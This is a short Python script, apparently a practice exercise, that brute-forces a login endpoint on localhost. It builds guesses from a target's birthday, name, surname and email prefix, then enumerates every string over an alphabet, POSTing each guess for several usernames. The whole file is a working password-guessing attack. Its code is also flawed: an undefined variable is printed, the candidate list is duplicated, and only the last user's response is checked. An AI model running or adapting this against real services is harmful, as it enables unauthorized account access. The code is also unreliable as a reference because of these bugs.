import requests
from genpass import BadPasswordGenerator

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
email = 'email@mail.com'
name = 'name'
surname = 'surname'
birthday = '11 02 12 feb 2012'
url = 'http://127.0.0.1:5000/auth'
users = ['admin', 'jack', 'cat']


def BrutForce_data(url='http://127.0.0.1:5000/auth', users='admin', email='',name='',surname='',birthday=''):
    email = email[:email.find('@')]
    alphabet_list = [i for i in birthday.split()]
    alphabet_list.append(name)
    alphabet_list.append(surname)
    alphabet_list.append(email)
    BrutForce_passlist(alphabet_list,users)
    return

def BrutForce_passlist(list_add='', users='admin', alphabet = '0123456789abcdefghijklmnopqrstuvwxyz', url='http://127.0.0.1:5000/auth'):
    alphabet = list_add
    alphabet += list(alphabet)
    base = len(alphabet)
    length = 0
    counter = 0
    good_result = 0
    generator = BadPasswordGenerator()

    while True:
        try:
            gen_pass = generator.next()
            for i in users:
                response = requests.post(url,
                                        json={'login': i, 'password':gen_pass})
            if response.status_code == 200:
                print('SUCCESS', result)
                good_result += 1
                break

        except IndexError:
            print('Все пароли перебраны')
            break


    while True:
        result = ''
        number = counter
        while number > 0:
            rest = number % base
            result = alphabet[rest] + result
            number = number // base

        while len(result) < length:
            result = alphabet[0] + result

        for i in users:
            response = requests.post(url,
                                 json={'login': i, 'password': result})

        if response.status_code == 200:
            print('SUCCESS', result)
            good_result +=1
            if good_result == len(users):
                break

        if alphabet[-1] * length == result:
            # встретили последний пароль для данной длины
            length += 1
            counter = 0
        else:
            counter += 1


BrutForce_data(url, users, email, name, surname, birthday)
